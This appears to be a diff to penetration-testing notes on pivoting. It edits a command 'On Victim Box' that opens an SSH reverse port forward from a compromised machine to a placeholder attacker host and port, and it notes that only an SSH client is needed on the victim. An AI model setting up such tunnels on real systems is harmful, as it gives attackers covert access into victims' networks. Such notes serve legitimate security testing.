@@ -21,7 +21,7 @@ Sudo systemctl start ssh.service
 ##### On Victim Box
 
 ```
-sudo ssh -N -f -R 127.0.0.1:9080 user@attacker -p diff_port                                                                                                  
+ssh -N -f -R 127.0.0.1:9080 attacker_username@attacker_IP -p unique_pivot_port                                                                                                  
 ```
 
 This only requires an ssh client on the victim machine which is extremely common. Only other thing required it to start ssh on your attacker box, as well as a port forwarding rule if it's going over the internet. 
